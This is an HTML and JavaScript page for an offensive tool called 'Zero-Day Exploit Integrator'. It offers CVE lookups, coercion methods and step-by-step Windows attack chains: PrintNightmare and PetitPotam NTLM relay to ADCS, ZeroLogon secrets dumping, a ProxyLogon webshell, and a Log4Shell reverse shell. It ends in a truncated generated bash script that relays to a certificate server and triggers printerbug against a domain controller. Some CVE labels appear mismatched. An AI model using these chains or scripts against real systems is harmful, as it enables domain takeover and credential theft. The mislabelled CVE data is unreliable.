<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <title>Zero-Day Exploit Integrator - MONOLITH</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --zd-critical: #dc2626;
            --zd-high: #ea580c;
            --zd-medium: #ca8a04;
            --zd-low: #16a34a;
            --zd-unknown: #6b7280;
            --zd-accent: #8b5cf6;
            --zd-glow: rgba(139, 92, 246, 0.5);
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Space Grotesk', system-ui, sans-serif;
            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #0f0f1a 100%);
            min-height: 100vh;
            color: #e5e7eb;
        }
        .zeroday-container { max-width: 1800px; margin: 0 auto; padding: 20px; }
        .zd-header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%);
            border-radius: 16px; padding: 30px; margin-bottom: 25px;
            border: 1px solid rgba(139, 92, 246, 0.3);
        }
        .zd-title { font-size: 2.2rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
        .zd-title i { color: var(--zd-accent); }
        .zd-subtitle { color: #9ca3af; font-size: 1rem; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card {
            background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
            border-radius: 12px; padding: 20px; border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-3px); border-color: var(--zd-accent); }
        .stat-card.critical { border-left: 4px solid var(--zd-critical); }
        .stat-card.high { border-left: 4px solid var(--zd-high); }
        .stat-card.medium { border-left: 4px solid var(--zd-medium); }
        .stat-value { font-size: 1.8rem; font-weight: 700; color: #fff; }
        .stat-label { color: #9ca3af; font-size: 0.85rem; margin-top: 5px; }
        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
        @media (max-width: 1024px) { .main-grid { grid-template-columns: 1fr; } }
        .panel {
            background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
            border-radius: 16px; padding: 25px; border: 1px solid rgba(255,255,255,0.1);
        }
        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .panel-title { font-size: 1.2rem; font-weight: 600; color: #fff; display: flex; align-items: center; gap: 10px; }
        .panel-title i { color: var(--zd-accent); }
        .search-form { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
        .search-input, .search-select {
            padding: 12px 16px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);
            background: rgba(0,0,0,0.3); color: #fff; font-size: 0.95rem;
        }
        .search-input { flex: 1; min-width: 200px; }
        .search-input:focus, .search-select:focus { outline: none; border-color: var(--zd-accent); }
        .search-input::placeholder { color: #6b7280; }
        .search-select option { background: #1e1e2e; }
        .btn {
            padding: 12px 20px; border-radius: 8px; font-weight: 600; cursor: pointer;
            border: none; display: inline-flex; align-items: center; gap: 8px; transition: all 0.3s;
        }
        .btn-primary { background: linear-gradient(135deg, var(--zd-accent), #7c3aed); color: #fff; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(139,92,246,0.4); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-warning { background: linear-gradient(135deg, var(--zd-high), #c2410c); color: #fff; }
        .btn-success { background: linear-gradient(135deg, var(--zd-low), #15803d); color: #fff; }
        .cve-list { max-height: 400px; overflow-y: auto; }
        .cve-item {
            background: rgba(0,0,0,0.2); border-radius: 10px; padding: 15px; margin-bottom: 10px;
            border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: all 0.3s;
        }
        .cve-item:hover { border-color: var(--zd-accent); background: rgba(139,92,246,0.1); }
        .cve-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .cve-id { font-weight: 700; font-size: 1.05rem; color: var(--zd-accent); }
        .severity-badge { padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; text-transform: uppercase; }
        .severity-critical { background: var(--zd-critical); color: #fff; }
        .severity-high { background: var(--zd-high); color: #fff; }
        .severity-medium { background: var(--zd-medium); color: #fff; }
        .severity-low { background: var(--zd-low); color: #fff; }
        .cve-description { color: #d1d5db; font-size: 0.9rem; line-height: 1.4; margin-bottom: 8px; }
        .cve-meta { display: flex; gap: 15px; flex-wrap: wrap; font-size: 0.8rem; }
        .cve-meta-item { color: #9ca3af; display: flex; align-items: center; gap: 5px; }
        .cve-meta-item i { color: var(--zd-accent); }
        .risk-meter { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 20px; }
        .risk-score-display { display: flex; align-items: center; gap: 20px; }
        .risk-circle {
            width: 90px; height: 90px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-size: 1.8rem; font-weight: 700; color: #fff; background: var(--zd-critical);
        }
        .risk-details { flex: 1; }
        .risk-factors { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .risk-factor-label { font-size: 0.75rem; color: #9ca3af; margin-bottom: 4px; }
        .risk-factor-bar { height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; }
        .risk-factor-fill { height: 100%; border-radius: 3px; transition: width 0.5s; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
        .tab { padding: 10px 20px; background: transparent; border: none; color: #9ca3af; cursor: pointer; border-radius: 8px 8px 0 0; transition: all 0.3s; }
        .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
        .tab.active { color: #fff; background: var(--zd-accent); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .chain-templates { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .chain-template {
            background: rgba(0,0,0,0.3); border-radius: 10px; padding: 15px;
            border: 2px solid transparent; cursor: pointer; transition: all 0.3s;
        }
        .chain-template:hover { border-color: var(--zd-accent); transform: scale(1.02); }
        .chain-template.selected { border-color: var(--zd-accent); background: rgba(139,92,246,0.2); }
        .chain-template-name { font-weight: 600; color: #fff; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
        .chain-template-desc { font-size: 0.8rem; color: #9ca3af; }
        .chain-success { margin-top: 8px; font-size: 0.75rem; color: var(--zd-low); }
        .chain-visual { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 20px; margin-top: 20px; }
        .chain-steps { display: flex; flex-direction: column; gap: 15px; }
        .chain-step { display: flex; align-items: center; gap: 15px; position: relative; }
        .chain-step::after {
            content: ''; position: absolute; left: 19px; top: 40px; width: 2px; height: calc(100% + 15px);
            background: linear-gradient(to bottom, var(--zd-accent), transparent);
        }
        .chain-step:last-child::after { display: none; }
        .step-number {
            width: 40px; height: 40px; border-radius: 50%; background: var(--zd-accent);
            display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff; flex-shrink: 0; z-index: 1;
        }
        .step-content { flex: 1; background: rgba(255,255,255,0.05); border-radius: 8px; padding: 12px 15px; border: 1px solid rgba(255,255,255,0.1); }
        .step-action { font-weight: 600; color: var(--zd-accent); font-size: 0.8rem; text-transform: uppercase; margin-bottom: 3px; }
        .step-description { color: #d1d5db; font-size: 0.9rem; }
        .step-tool { color: #9ca3af; font-size: 0.75rem; margin-top: 5px; }
        .coercion-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; }
        .coercion-card {
            background: rgba(0,0,0,0.3); border-radius: 10px; padding: 15px;
            border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s;
        }
        .coercion-card:hover { border-color: var(--zd-accent); }
        .coercion-name { font-weight: 600; color: #fff; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
        .coercion-cve { font-size: 0.75rem; color: var(--zd-accent); margin-bottom: 5px; }
        .coercion-meta { font-size: 0.75rem; color: #9ca3af; }
        .coercion-auth { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; margin-top: 8px; }
        .coercion-auth.no-auth { background: var(--zd-critical); color: #fff; }
        .coercion-auth.requires-auth { background: var(--zd-medium); color: #fff; }
        .relay-config { background: rgba(0,0,0,0.2); border-radius: 10px; padding: 20px; }
        .relay-form { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .form-group { display: flex; flex-direction: column; gap: 5px; }
        .form-group label { font-size: 0.85rem; color: #d1d5db; }
        .relay-target-select { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 10px 15px; color: #fff; }
        .alert-list { max-height: 350px; overflow-y: auto; }
        .alert-item {
            display: flex; align-items: center; gap: 15px; padding: 12px;
            background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 8px; border-left: 3px solid var(--zd-critical);
        }
        .alert-item.high { border-left-color: var(--zd-high); }
        .alert-item.medium { border-left-color: var(--zd-medium); }
        .alert-icon { font-size: 1.3rem; }
        .alert-content { flex: 1; }
        .alert-title { font-weight: 600; color: #fff; margin-bottom: 3px; font-size: 0.9rem; }
        .alert-time { font-size: 0.75rem; color: #9ca3af; }
        .monitor-status { display: flex; align-items: center; gap: 8px; }
        .status-indicator { width: 10px; height: 10px; border-radius: 50%; background: var(--zd-low); animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .code-output { background: #0d1117; border-radius: 8px; padding: 15px; margin-top: 15px; position: relative; font-family: 'JetBrains Mono', monospace; }
        .code-output pre { margin: 0; color: #c9d1d9; font-size: 0.8rem; line-height: 1.5; overflow-x: auto; white-space: pre-wrap; }
        .copy-btn { position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.1); border: none; color: #9ca3af; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
        .copy-btn:hover { background: var(--zd-accent); color: #fff; }
        .full-width-section { margin-bottom: 25px; }
        .toast {
            position: fixed; bottom: 30px; right: 30px; padding: 15px 25px;
            background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
            border: 1px solid var(--zd-accent); border-radius: 10px; color: #fff;
            display: flex; align-items: center; gap: 10px; transform: translateX(150%); transition: transform 0.3s; z-index: 1000;
        }
        .toast.show { transform: translateX(0); }
        .toast.success { border-color: var(--zd-low); }
        .toast.error { border-color: var(--zd-critical); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
        ::-webkit-scrollbar-thumb { background: var(--zd-accent); border-radius: 3px; }
        .placeholder-text { text-align: center; padding: 40px; color: #9ca3af; }
        .placeholder-text i { font-size: 2.5rem; margin-bottom: 15px; display: block; color: var(--zd-accent); }
    </style>
</head>
<body>
<div class="zeroday-container">
    <!-- Header -->
    <div class="zd-header">
        <h1 class="zd-title"><i class="fas fa-bug"></i> Zero-Day Exploit Integrator</h1>
        <p class="zd-subtitle">Real-time CVE monitoring, AI-powered risk scoring, and automated exploit chain generation</p>
    </div>

    <!-- Stats Grid -->
    <div class="stats-grid">
        <div class="stat-card critical"><div class="stat-value" id="criticalCount">24</div><div class="stat-label">Critical CVEs</div></div>
        <div class="stat-card high"><div class="stat-value" id="highCount">87</div><div class="stat-label">High Severity</div></div>
        <div class="stat-card medium"><div class="stat-value" id="mediumCount">156</div><div class="stat-label">Medium Severity</div></div>
        <div class="stat-card"><div class="stat-value" id="chainsGenerated">0</div><div class="stat-label">Chains Generated</div></div>
        <div class="stat-card"><div class="stat-value">24/7</div><div class="stat-label">Monitoring Active</div></div>
    </div>

    <!-- Main Grid -->
    <div class="main-grid">
        <!-- CVE Search Panel -->
        <div class="panel">
            <div class="panel-header"><h2 class="panel-title"><i class="fas fa-search"></i> CVE Database Search</h2></div>
            <form class="search-form" id="cveSearchForm">
                <input type="text" class="search-input" id="cveQuery" placeholder="CVE-2021-34527 or keyword...">
                <select class="search-select" id="severityFilter">
                    <option value="">All Severities</option>
                    <option value="CRITICAL">Critical</option>
                    <option value="HIGH">High</option>
                    <option value="MEDIUM">Medium</option>
                </select>
                <select class="search-select" id="vendorFilter">
                    <option value="">All Vendors</option>
                    <option value="microsoft">Microsoft</option>
                    <option value="cisco">Cisco</option>
                    <option value="fortinet">Fortinet</option>
                    <option value="vmware">VMware</option>
                </select>
                <button type="submit" class="btn btn-primary"><i class="fas fa-search"></i> Search</button>
            </form>
            <div class="cve-list" id="cveResults">
                <div class="placeholder-text"><i class="fas fa-database"></i>Search the NVD database for CVEs</div>
            </div>
        </div>

        <!-- AI Risk Analysis Panel -->
        <div class="panel">
            <div class="panel-header"><h2 class="panel-title"><i class="fas fa-brain"></i> AI Risk Analysis</h2></div>
            <div class="risk-meter" id="riskMeter" style="display: none;">
                <div class="risk-score-display">
                    <div class="risk-circle" id="riskScore">0</div>
                    <div class="risk-details">
                        <h4 style="color: #fff; margin-bottom: 10px;" id="selectedCVE">No CVE Selected</h4>
                        <div class="risk-factors">
                            <div><span class="risk-factor-label">CVSS Score</span><div class="risk-factor-bar"><div class="risk-factor-fill" id="cvssBar" style="width: 0%; background: var(--zd-critical);"></div></div></div>
                            <div><span class="risk-factor-label">Exploitability</span><div class="risk-factor-bar"><div class="risk-factor-fill" id="exploitBar" style="width: 0%; background: var(--zd-high);"></div></div></div>
                            <div><span class="risk-factor-label">Impact</span><div class="risk-factor-bar"><div class="risk-factor-fill" id="impactBar" style="width: 0%; background: var(--zd-medium);"></div></div></div>
                            <div><span class="risk-factor-label">Vendor Critical</span><div class="risk-factor-bar"><div class="risk-factor-fill" id="vendorBar" style="width: 0%; background: var(--zd-accent);"></div></div></div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="riskPlaceholder" class="placeholder-text"><i class="fas fa-chart-line"></i>Select a CVE to analyze risk</div>
            <div style="margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="btn btn-primary" id="generateChainBtn" disabled><i class="fas fa-link"></i> Generate Chain</button>
                <button class="btn btn-warning" id="integrateRelayBtn" disabled><i class="fas fa-network-wired"></i> Relay Ninja</button>
            </div>
        </div>
    </div>

    <!-- Exploit Chain Builder -->
    <div class="panel full-width-section">
        <div class="panel-header">
            <h2 class="panel-title"><i class="fas fa-link"></i> Exploit Chain Builder</h2>
            <div class="monitor-status"><span class="status-indicator"></span><span style="color: #9ca3af;">Auto-chain enabled</span></div>
        </div>
        <div class="tabs">
            <button class="tab active" data-tab="templates">Chain Templates</button>
            <button class="tab" data-tab="custom">Custom Chain</button>
            <button class="tab" data-tab="generated">Generated Chains</button>
        </div>
        <div class="tab-content active" id="templates">
            <div class="chain-templates">
                <div class="chain-template" data-chain="printer_to_domain">
                    <div class="chain-template-name"><i class="fas fa-print"></i> Printer to Domain Admin</div>
                    <div class="chain-template-desc">PrintNightmare ‚Üí ADCS ESC8 ‚Üí Domain Compromise</div>
                    <div class="chain-success"><i class="fas fa-check-circle"></i> 85% Success Rate</div>
                </div>
                <div class="chain-template" data-chain="petitpotam_esc8">
                    <div class="chain-template-name"><i class="fas fa-file-alt"></i> PetitPotam ESC8</div>
                    <div class="chain-template-desc">EFS Coercion ‚Üí Web Enrollment ‚Üí DCSync</div>
                    <div class="chain-success"><i class="fas fa-check-circle"></i> 90% Success Rate</div>
                </div>
                <div class="chain-template" data-chain="zerologon">
                    <div class="chain-template-name"><i class="fas fa-shield-alt"></i> ZeroLogon Chain</div>
                    <div class="chain-template-desc">Reset DC Password ‚Üí Secrets Dump ‚Üí Restore</div>
                    <div class="chain-success"><i class="fas fa-check-circle"></i> 95% Success Rate</div>
                </div>
                <div class="chain-template" data-chain="proxylogon">
                    <div class="chain-template-name"><i class="fas fa-envelope"></i> ProxyLogon Chain</div>
                    <div class="chain-template-desc">Exchange SSRF ‚Üí Webshell ‚Üí Domain Pivot</div>
                    <div class="chain-success"><i class="fas fa-check-circle"></i> 80% Success Rate</div>
                </div>
                <div class="chain-template" data-chain="log4shell">
                    <div class="chain-template-name"><i class="fab fa-java"></i> Log4Shell Chain</div>
                    <div class="chain-template-desc">JNDI Injection ‚Üí RCE ‚Üí Persistence</div>
                    <div class="chain-success"><i class="fas fa-check-circle"></i> 75% Success Rate</div>
                </div>
            </div>
            <div class="chain-visual" id="chainVisual" style="display: none;">
                <h4 style="color: #fff; margin-bottom: 15px;"><i class="fas fa-sitemap" style="color: var(--zd-accent);"></i> Chain Steps</h4>
                <div class="chain-steps" id="chainSteps"></div>
            </div>
        </div>
        <div class="tab-content" id="custom">
            <div class="relay-config">
                <h4 style="color: #fff; margin-bottom: 15px;">Build Custom Exploit Chain</h4>
                <div class="relay-form">
                    <div class="form-group"><label>Target Type</label><select class="relay-target-select" id="customTargetType"><option value="active_directory">Active Directory</option><option value="exchange">Microsoft Exchange</option><option value="web_application">Web Application</option></select></div>
                    <div class="form-group"><label>Initial Access CVE</label><input type="text" class="search-input" id="initialCVE" placeholder="CVE-2021-XXXXX"></div>
                    <div class="form-group"><label>Coercion Method</label><select class="relay-target-select" id="customCoercion"><option value="petitpotam">PetitPotam (No Auth)</option><option value="printnightmare">PrintNightmare</option><option value="printerbug">PrinterBug</option><option value="shadowcoerce">ShadowCoerce</option></select></div>
                    <div class="form-group"><label>Relay Target</label><select class="relay-target-select" id="customRelayTarget"><option value="ldap">LDAP (RBCD)</option><option value="adcs">ADCS (ESC8)</option><option value="http">HTTP Relay</option></select></div>
                </div>
                <button class="btn btn-primary" style="margin-top: 15px;" id="buildCustomChain"><i class="fas fa-hammer"></i> Build Chain</button>
            </div>
        </div>
        <div class="tab-content" id="generated"><div id="generatedChainsList" class="placeholder-text"><i class="fas fa-code-branch"></i>No chains generated yet</div></div>
    </div>

    <!-- Coercion Methods & Alerts -->
    <div class="main-grid">
        <div class="panel">
            <div class="panel-header"><h2 class="panel-title"><i class="fas fa-broadcast-tower"></i> Coercion Methods</h2></div>
            <div class="coercion-grid">
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-print"></i> PrintNightmare</div><div class="coercion-cve">CVE-2021-34527</div><div class="coercion-meta">Port: 445 | Pipe: spoolss</div><span class="coercion-auth no-auth">No Auth</span></div>
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-file-alt"></i> PetitPotam</div><div class="coercion-cve">CVE-2021-36942</div><div class="coercion-meta">Port: 445 | Pipe: efsrpc</div><span class="coercion-auth no-auth">No Auth</span></div>
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-print"></i> PrinterBug</div><div class="coercion-cve">CVE-2021-1675</div><div class="coercion-meta">Port: 445 | Pipe: spoolss</div><span class="coercion-auth requires-auth">Auth Req</span></div>
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-copy"></i> ShadowCoerce</div><div class="coercion-cve">CVE-2022-30213</div><div class="coercion-meta">Port: 445 | Pipe: FssagentRpc</div><span class="coercion-auth requires-auth">Auth Req</span></div>
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-folder"></i> DFSCoerce</div><div class="coercion-cve">CVE-2022-26925</div><div class="coercion-meta">Port: 445 | Pipe: netdfs</div><span class="coercion-auth requires-auth">Auth Req</span></div>
                <div class="coercion-card"><div class="coercion-name"><i class="fas fa-network-wired"></i> Coercer</div><div class="coercion-cve">Multiple CVEs</div><div class="coercion-meta">Multi-pipe scanner</div><span class="coercion-auth no-auth">Mixed</span></div>
            </div>
        </div>
        <div class="panel">
            <div class="panel-header">
                <h2 class="panel-title"><i class="fas fa-bell"></i> Recent CVE Alerts</h2>
                <div class="monitor-status"><span class="status-indicator"></span><span style="color: #9ca3af;">Live</span></div>
            </div>
            <div class="alert-list" id="alertList">
                <div class="alert-item"><span class="alert-icon">üö®</span><div class="alert-content"><div class="alert-title">CVE-2024-21762 - FortiOS RCE</div><div class="alert-time">2 hours ago - AI Risk: 95/100</div></div></div>
                <div class="alert-item high"><span class="alert-icon">‚ö†Ô∏è</span><div class="alert-content"><div class="alert-title">CVE-2024-3400 - PAN-OS Command Injection</div><div class="alert-time">5 hours ago - AI Risk: 88/100</div></div></div>
                <div class="alert-item high"><span class="alert-icon">‚ö†Ô∏è</span><div class="alert-content"><div class="alert-title">CVE-2024-1709 - ConnectWise RCE</div><div class="alert-time">8 hours ago - AI Risk: 85/100</div></div></div>
                <div class="alert-item medium"><span class="alert-icon">üì¢</span><div class="alert-content"><div class="alert-title">CVE-2024-21413 - Outlook RCE</div><div class="alert-time">12 hours ago - AI Risk: 72/100</div></div></div>
            </div>
            <button class="btn btn-primary" style="width: 100%; margin-top: 15px;" id="refreshAlerts"><i class="fas fa-sync-alt"></i> Refresh Alerts</button>
        </div>
    </div>

    <!-- Code Output -->
    <div class="panel full-width-section" id="codeOutputPanel" style="display: none;">
        <div class="panel-header"><h2 class="panel-title"><i class="fas fa-code"></i> Generated Exploit Code</h2></div>
        <div class="code-output"><button class="copy-btn" onclick="copyCode()"><i class="fas fa-copy"></i> Copy</button><pre id="generatedCode"></pre></div>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"><i class="fas fa-check-circle"></i><span id="toastMessage">Action completed</span></div>

<script>
let selectedCVE = null, selectedChain = null, generatedChains = [];
const chainTemplates = {
    printer_to_domain: { name: 'Printer to Domain Admin', steps: [
        { action: 'Enumerate', description: 'Find DCs with Print Spooler', tool: 'rpcdump.py' },
        { action: 'Setup', description: 'Start ntlmrelayx targeting ADCS', tool: 'ntlmrelayx.py' },
        { action: 'Coerce', description: 'Trigger PrinterBug callback', tool: 'printerbug.py' },
        { action: 'Relay', description: 'Relay to AD Certificate Services', tool: 'ntlmrelayx.py' },
        { action: 'Extract', description: 'Obtain domain admin certificate', tool: 'certipy' },
        { action: 'Auth', description: 'Get TGT with certificate', tool: 'gettgtpkinit.py' }
    ]},
    petitpotam_esc8: { name: 'PetitPotam ESC8', steps: [
        { action: 'Setup', description: 'Start relay to ADCS web enrollment', tool: 'ntlmrelayx.py' },
        { action: 'Coerce', description: 'Trigger EFS coercion', tool: 'petitpotam.py' },
        { action: 'Relay', description: 'Relay DC auth to ADCS', tool: 'ntlmrelayx.py' },
        { action: 'Request', description: 'Request DC certificate', tool: 'certipy' },
        { action: 'DCSync', description: 'DCSync using certificate', tool: 'secretsdump.py' }
    ]},
    zerologon: { name: 'ZeroLogon Chain', steps: [
        { action: 'Exploit', description: 'Reset DC machine password', tool: 'zerologon.py' },
        { action: 'Extract', description: 'Dump NTDS.dit', tool: 'secretsdump.py' },
        { action: 'Restore', description: 'Restore DC password', tool: 'restorepassword.py' }
    ]},
    proxylogon: { name: 'ProxyLogon RCE', steps: [
        { action: 'Exploit', description: 'SSRF to backend auth', tool: 'proxylogon.py' },
        { action: 'Upload', description: 'Upload webshell', tool: 'webshell' },
        { action: 'Pivot', description: 'Pivot to DC', tool: 'proxychains' }
    ]},
    log4shell: { name: 'Log4Shell', steps: [
        { action: 'Setup', description: 'Start rogue LDAP server', tool: 'rogue-jndi' },
        { action: 'Inject', description: 'Send JNDI payload', tool: 'curl' },
        { action: 'Execute', description: 'Receive reverse shell', tool: 'nc' }
    ]}
};
const SAMPLE_CVES = [
    { id: 'CVE-2021-34527', severity: 'CRITICAL', cvss: 9.8, description: 'Windows Print Spooler RCE (PrintNightmare)', published: '2021-07-01', vendor: 'Microsoft', exploit_status: 'In The Wild' },
    { id: 'CVE-2021-36942', severity: 'HIGH', cvss: 7.5, description: 'Windows LSA Spoofing (PetitPotam)', published: '2021-08-10', vendor: 'Microsoft', exploit_status: 'Weaponized' },
    { id: 'CVE-2020-1472', severity: 'CRITICAL', cvss: 10.0, description: 'Netlogon Elevation of Privilege (ZeroLogon)', published: '2020-08-11', vendor: 'Microsoft', exploit_status: 'In The Wild' },
    { id: 'CVE-2021-44228', severity: 'CRITICAL', cvss: 10.0, description: 'Apache Log4j2 RCE (Log4Shell)', published: '2021-12-10', vendor: 'Apache', exploit_status: 'In The Wild' },
    { id: 'CVE-2024-21762', severity: 'CRITICAL', cvss: 9.8, description: 'FortiOS Out-of-bounds Write', published: '2024-02-08', vendor: 'Fortinet', exploit_status: 'In The Wild' },
    { id: 'CVE-2021-26855', severity: 'CRITICAL', cvss: 9.8, description: 'Microsoft Exchange SSRF (ProxyLogon)', published: '2021-03-02', vendor: 'Microsoft', exploit_status: 'In The Wild' }
];

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('cveSearchForm').addEventListener('submit', e => { e.preventDefault(); searchCVE(); });
    document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', function() { switchTab(this.dataset.tab); }));
    document.querySelectorAll('.chain-template').forEach(t => t.addEventListener('click', function() { selectChainTemplate(this.dataset.chain); }));
    document.getElementById('generateChainBtn').addEventListener('click', generateExploitChain);
    document.getElementById('integrateRelayBtn').addEventListener('click', integrateToRelayNinja);
    document.getElementById('buildCustomChain').addEventListener('click', buildCustomChain);
    document.getElementById('refreshAlerts').addEventListener('click', () => showToast('Alerts refreshed', 'success'));
});

function searchCVE() {
    const query = document.getElementById('cveQuery').value.toLowerCase();
    const severity = document.getElementById('severityFilter').value;
    const vendor = document.getElementById('vendorFilter').value.toLowerCase();
    let results = SAMPLE_CVES.filter(c => {
        if (query && !c.id.toLowerCase().includes(query) && !c.description.toLowerCase().includes(query)) return false;
        if (severity && c.severity !== severity) return false;
        if (vendor && !c.vendor.toLowerCase().includes(vendor)) return false;
        return true;
    });
    displayCVEResults(results);
}

function displayCVEResults(results) {
    const div = document.getElementById('cveResults');
    if (!results.length) { div.innerHTML = '<div class="placeholder-text"><i class="fas fa-search-minus"></i>No CVEs found</div>'; return; }
    div.innerHTML = results.map(c => `
        <div class="cve-item" onclick="selectCVE('${c.id}', ${c.cvss}, '${c.severity}', '${c.vendor}')">
            <div class="cve-header"><span class="cve-id">${c.id}</span><span class="severity-badge severity-${c.severity.toLowerCase()}">${c.severity}</span></div>
            <div class="cve-description">${c.description}</div>
            <div class="cve-meta">
                <span class="cve-meta-item"><i class="fas fa-chart-bar"></i> CVSS: ${c.cvss}</span>
                <span class="cve-meta-item"><i class="fas fa-building"></i> ${c.vendor}</span>
                <span class="cve-meta-item"><i class="fas fa-bolt"></i> ${c.exploit_status}</span>
            </div>
        </div>
    `).join('');
}

function selectCVE(id, cvss, severity, vendor) {
    selectedCVE = { id, cvss, severity, vendor };
    document.getElementById('riskPlaceholder').style.display = 'none';
    document.getElementById('riskMeter').style.display = 'block';
    document.getElementById('selectedCVE').textContent = id;
    const aiRisk = Math.min(100, Math.round(cvss * 8 + (severity === 'CRITICAL' ? 15 : severity === 'HIGH' ? 10 : 5) + 5));
    animateRiskScore(aiRisk);
    document.getElementById('cvssBar').style.width = `${cvss * 10}%`;
    document.getElementById('exploitBar').style.width = `${severity === 'CRITICAL' ? 95 : 75}%`;
    document.getElementById('impactBar').style.width = `${cvss * 8}%`;
    document.getElementById('vendorBar').style.width = '90%';
    document.getElementById('generateChainBtn').disabled = false;
    document.getElementById('integrateRelayBtn').disabled = false;
    showToast(`Selected ${id}`, 'success');
}

function animateRiskScore(target) {
    const el = document.getElementById('riskScore');
    let current = 0;
    const interval = setInterval(() => {
        if (current >= target) { clearInterval(interval); return; }
        current += 2;
        el.textContent = Math.min(current, target);
        if (current >= 80) el.style.background = 'var(--zd-critical)';
        else if (current >= 60) el.style.background = 'var(--zd-high)';
        else el.style.background = 'var(--zd-medium)';
    }, 20);
}

function switchTab(tabId) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function selectChainTemplate(chainId) {
    selectedChain = chainId;
    document.querySelectorAll('.chain-template').forEach(t => t.classList.remove('selected'));
    document.querySelector(`[data-chain="${chainId}"]`).classList.add('selected');
    const chain = chainTemplates[chainId];
    document.getElementById('chainSteps').innerHTML = chain.steps.map((s, i) => `
        <div class="chain-step">
            <div class="step-number">${i + 1}</div>
            <div class="step-content">
                <div class="step-action">${s.action}</div>
                <div class="step-description">${s.description}</div>
                <div class="step-tool"><i class="fas fa-wrench"></i> ${s.tool}</div>
            </div>
        </div>
    `).join('');
    document.getElementById('chainVisual').style.display = 'block';
    showToast(`Selected ${chain.name}`, 'success');
}

function generateExploitChain() {
    if (!selectedCVE && !selectedChain) { showToast('Select a CVE or chain first', 'error'); return; }
    const code = selectedChain ? generateChainCode(selectedChain) : generateCVECode(selectedCVE.id);
    document.getElementById('codeOutputPanel').style.display = 'block';
    document.getElementById('generatedCode').textContent = code;
    generatedChains.push({ chain: selectedChain || 'Custom', cve: selectedCVE?.id || 'N/A', time: new Date().toLocaleString() });
    document.getElementById('chainsGenerated').textContent = generatedChains.length;
    showToast('Exploit chain generated!', 'success');
}

function generateChainCode(chainId) {
    const codes = {
        printer_to_domain: `#!/bin/bash
# PrintNightmare to Domain Admin
TARGET_DC="dc01.domain.local"
ATTACKER_IP="192.168.1.100"

# 1. Enumerate
rpcdump.py -p 135 $TARGET_DC | grep -i "MS-RPRN"

# 2. Start relay
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController &

# 3. Trigger coercion
python3 printerbug.py domain.local/user:password@$TARGET_DC $ATTACKER_IP

# 4. Get TGT
